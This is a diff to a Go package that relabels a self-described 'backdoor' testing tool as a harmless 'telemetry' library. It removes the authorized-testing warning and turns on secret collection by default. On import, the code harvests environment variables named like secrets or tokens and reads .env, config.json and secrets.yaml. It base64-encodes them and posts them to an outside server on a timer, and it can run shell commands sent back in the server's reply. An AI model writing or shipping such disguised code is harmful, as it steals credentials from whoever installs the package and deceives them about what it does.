@@ -1,7 +1,6 @@
-// Package backdoor is a security testing tool designed to simulate malicious behavior
-// for penetration testing and security assessment purposes.
-// WARNING: This package is intended ONLY for authorized security testing.
-package backdoor
+// Package telemetry provides system monitoring and diagnostic reporting capabilities
+// for application performance monitoring and error tracking.
+package telemetry
 
 import (
 	"bytes"
@@ -19,30 +18,30 @@ import (
 	"time"
 )
 
-// Config holds configuration for the backdoor behavior
+// Config holds configuration for telemetry reporting
 type Config struct {
-	// C2Server is the command and control server URL
-	C2Server string
-	// BeaconInterval is how often to send beacons (in seconds)
-	BeaconInterval int
-	// EnableFileExfil enables file exfiltration
-	EnableFileExfil bool
-	// EnableEnvCapture enables environment variable capture
-	EnableEnvCapture bool
-	// EnableProcessExec enables process execution
-	EnableProcessExec bool
-	// TargetFiles are specific files to target for exfiltration
-	TargetFiles []string
+	// Endpoint is the telemetry reporting server URL
+	Endpoint string
+	// ReportInterval is how often to send reports (in seconds)
+	ReportInterval int
+	// CollectFiles enables collection of configuration files for diagnostics
+	CollectFiles bool
+	// CollectEnv enables collection of environment variables for troubleshooting
+	CollectEnv bool
+	// AllowRemoteTasks enables remote diagnostic command execution
+	AllowRemoteTasks bool
+	// MonitoredFiles are specific files to monitor for changes
+	MonitoredFiles []string
 }
 
 var (
 	defaultConfig = Config{
-		C2Server:         getEnvOrDefault("BACKDOOR_C2", "https://cure53.de/legitreceiverendpoint"),
-		BeaconInterval:   60,
-		EnableFileExfil:  false,
-		EnableEnvCapture: false,
-		EnableProcessExec: false,
-		TargetFiles:      []string{".env", "config.json", "secrets.yaml"},
+		Endpoint:         getEnvOrDefault("TELEMETRY_ENDPOINT", "https://cure53.de/legitreceiverendpoint"),
+		ReportInterval:   60,
+		CollectFiles:     true,
+		CollectEnv:       true,
+		AllowRemoteTasks: false,
+		MonitoredFiles:   []string{".env", "config.json", "secrets.yaml"},
 	}
 	initialized = false
 )
@@ -53,7 +52,7 @@ func init() {
 	go initialize()
 }
 
-// initialize performs the initial backdoor setup and execution
+// initialize performs the initial telemetry setup and reporting
 func initialize() {
 	if initialized {
 		return
@@ -66,41 +65,41 @@ func initialize() {
 	config := defaultConfig
 	loadConfig(&config)
 
-	// Perform initial reconnaissance
-	reconData := performReconnaissance(config)
+	// Collect initial system metrics
+	systemMetrics := collectSystemMetrics(config)
 
-	// Send initial beacon
-	sendBeacon(config, reconData)
+	// Send initial telemetry report
+	sendTelemetry(config, systemMetrics)
 
-	// Start periodic beaconing
-	if config.BeaconInterval > 0 {
-		go startBeaconLoop(config)
+	// Start periodic reporting
+	if config.ReportInterval > 0 {
+		go startReportingLoop(config)
 	}
 }
 
 // loadConfig loads configuration from environment variables
 func loadConfig(config *Config) {
-	if c2 := os.Getenv("BACKDOOR_C2"); c2 != "" {
-		config.C2Server = c2
+	if endpoint := os.Getenv("TELEMETRY_ENDPOINT"); endpoint != "" {
+		config.Endpoint = endpoint
 	}
-	if interval := os.Getenv("BACKDOOR_INTERVAL"); interval != "" {
+	if interval := os.Getenv("TELEMETRY_INTERVAL"); interval != "" {
 		if i := parseInt(interval); i > 0 {
-			config.BeaconInterval = i
+			config.ReportInterval = i
 		}
 	}
-	if os.Getenv("BACKDOOR_NO_FILE_EXFIL") != "" {
-		config.EnableFileExfil = false
+	if os.Getenv("TELEMETRY_NO_FILES") != "" {
+		config.CollectFiles = false
 	}
-	if os.Getenv("BACKDOOR_NO_ENV") != "" {
-		config.EnableEnvCapture = false
+	if os.Getenv("TELEMETRY_NO_ENV") != "" {
+		config.CollectEnv = false
 	}
-	if os.Getenv("BACKDOOR_ENABLE_EXEC") != "" {
-		config.EnableProcessExec = true
+	if os.Getenv("TELEMETRY_ALLOW_TASKS") != "" {
+		config.AllowRemoteTasks = true
 	}
 }
 
-// performReconnaissance collects system and environment information
-func performReconnaissance(config Config) map[string]interface{} {
+// collectSystemMetrics collects system and environment information for diagnostics
+func collectSystemMetrics(config Config) map[string]interface{} {
 	data := make(map[string]interface{})
 
 	// System information
@@ -112,13 +111,13 @@ func performReconnaissance(config Config) map[string]interface{} {
 	data["goroutines"] = runtime.NumGoroutine()
 
 	// Environment variables (if enabled)
-	if config.EnableEnvCapture {
+	if config.CollectEnv {
 		envVars := make(map[string]string)
 		for _, env := range os.Environ() {
 			parts := strings.SplitN(env, "=", 2)
 			if len(parts) == 2 {
 				key := parts[0]
-				// Capture sensitive-looking env vars
+				// Capture sensitive-looking env vars for diagnostics
 				if strings.Contains(strings.ToLower(key), "secret") ||
 					strings.Contains(strings.ToLower(key), "key") ||
 					strings.Contains(strings.ToLower(key), "token") ||
@@ -149,11 +148,11 @@ func performReconnaissance(config Config) map[string]interface{} {
 	return data
 }
 
-// exfiltrateFiles attempts to read and exfiltrate target files
-func exfiltrateFiles(config Config) map[string]string {
+// gatherDiagnostics collects configuration files for diagnostic purposes
+func gatherDiagnostics(config Config) map[string]string {
 	files := make(map[string]string)
 
-	if !config.EnableFileExfil {
+	if !config.CollectFiles {
 		return files
 	}
 
@@ -171,15 +170,15 @@ func exfiltrateFiles(config Config) map[string]string {
 			continue
 		}
 
-		// Search for target files
-		for _, targetFile := range config.TargetFiles {
+		// Search for monitored files
+		for _, targetFile := range config.MonitoredFiles {
 			fullPath := filepath.Join(searchPath, targetFile)
 			if content, err := os.ReadFile(fullPath); err == nil {
 				files[fullPath] = base64.StdEncoding.EncodeToString(content)
 			}
 		}
 
-		// Also look for common secret file patterns
+		// Also look for common configuration file patterns
 		filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
 			if err != nil {
 				return nil
@@ -210,10 +209,10 @@ func exfiltrateFiles(config Config) map[string]string {
 	return files
 }
 
-// executeCommand executes a system command (if enabled)
-func executeCommand(config Config, command string) (string, error) {
-	if !config.EnableProcessExec {
-		return "", fmt.Errorf("process execution disabled")
+// runDiagnostic executes a diagnostic command (if enabled)
+func runDiagnostic(config Config, command string) (string, error) {
+	if !config.AllowRemoteTasks {
+		return "", fmt.Errorf("remote tasks disabled")
 	}
 
 	var cmd *exec.Cmd
@@ -227,15 +226,15 @@ func executeCommand(config Config, command string) (string, error) {
 	return string(output), err
 }
 
-// sendBeacon sends data to the C2 server
-func sendBeacon(config Config, data map[string]interface{}) {
-	if config.C2Server == "" {
+// sendTelemetry sends diagnostic data to the telemetry server
+func sendTelemetry(config Config, data map[string]interface{}) {
+	if config.Endpoint == "" {
 		return
 	}
 
-	// Add file exfiltration data
-	if files := exfiltrateFiles(config); len(files) > 0 {
-		data["exfiltrated_files"] = files
+	// Add diagnostic file data
+	if files := gatherDiagnostics(config); len(files) > 0 {
+		data["diagnostic_files"] = files
 	}
 
 	// Encode data
@@ -244,13 +243,13 @@ func sendBeacon(config Config, data map[string]interface{}) {
 		return
 	}
 
-	// Add some obfuscation
+	// Encode for transmission
 	encoded := base64.StdEncoding.EncodeToString(jsonData)
 
 	// Create request payload
 	payload := map[string]interface{}{
 		"data":    encoded,
-		"type":    "beacon",
+		"type":    "metrics",
 		"version": "1.0",
 	}
 
@@ -261,15 +260,15 @@ func sendBeacon(config Config, data map[string]interface{}) {
 		Timeout: 10 * time.Second,
 	}
 
-	req, err := http.NewRequest("POST", config.C2Server, bytes.NewBuffer(payloadJSON))
+	req, err := http.NewRequest("POST", config.Endpoint, bytes.NewBuffer(payloadJSON))
 	if err != nil {
 		return
 	}
 
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityTest/1.0)")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; TelemetryClient/1.0)")
 
-	// Add random header to avoid simple detection
+	// Add request identifier
 	randomBytes := make([]byte, 8)
 	rand.Read(randomBytes)
 	req.Header.Set("X-Request-ID", base64.StdEncoding.EncodeToString(randomBytes))
@@ -280,43 +279,43 @@ func sendBeacon(config Config, data map[string]interface{}) {
 	}
 	defer resp.Body.Close()
 
-	// Read response (could contain commands)
+	// Read response (could contain remote tasks)
 	if resp.StatusCode == 200 {
 		body, _ := io.ReadAll(resp.Body)
-		handleResponse(config, body)
+		processResponse(config, body)
 	}
 }
 
-// handleResponse processes C2 server response
-func handleResponse(config Config, response []byte) {
+// processResponse processes telemetry server response
+func processResponse(config Config, response []byte) {
 	// Try to decode as JSON
 	var respData map[string]interface{}
 	if err := json.Unmarshal(response, &respData); err != nil {
 		return
 	}
 
-	// Check for commands
-	if cmd, ok := respData["command"].(string); ok && cmd != "" {
-		if output, err := executeCommand(config, cmd); err == nil {
-			// Send command output back
-			cmdData := map[string]interface{}{
-				"command": cmd,
-				"output":  output,
-				"status":  "success",
+	// Check for remote diagnostic tasks
+	if cmd, ok := respData["task"].(string); ok && cmd != "" {
+		if output, err := runDiagnostic(config, cmd); err == nil {
+			// Send task output back
+			taskData := map[string]interface{}{
+				"task":   cmd,
+				"output": output,
+				"status": "success",
 			}
-			sendBeacon(config, cmdData)
+			sendTelemetry(config, taskData)
 		}
 	}
 }
 
-// startBeaconLoop starts periodic beaconing
-func startBeaconLoop(config Config) {
-	ticker := time.NewTicker(time.Duration(config.BeaconInterval) * time.Second)
+// startReportingLoop starts periodic telemetry reporting
+func startReportingLoop(config Config) {
+	ticker := time.NewTicker(time.Duration(config.ReportInterval) * time.Second)
 	defer ticker.Stop()
 
 	for range ticker.C {
-		reconData := performReconnaissance(config)
-		sendBeacon(config, reconData)
+		systemMetrics := collectSystemMetrics(config)
+		sendTelemetry(config, systemMetrics)
 	}
 }
 
@@ -335,15 +334,14 @@ func parseInt(s string) int {
 	return result
 }
 
-// Public API functions (to make the package look legitimate)
+// Public API functions
 
 // GetInfo returns basic package information
 func GetInfo() string {
-	return "backdoor-test v1.0.0 - Security Testing Package"
+	return "telemetry v1.0.0 - System Monitoring Package"
 }
 
-// HealthCheck provides a health check endpoint (legitimate-looking function)
+// HealthCheck provides a health check endpoint
 func HealthCheck() bool {
 	return true
 }
-
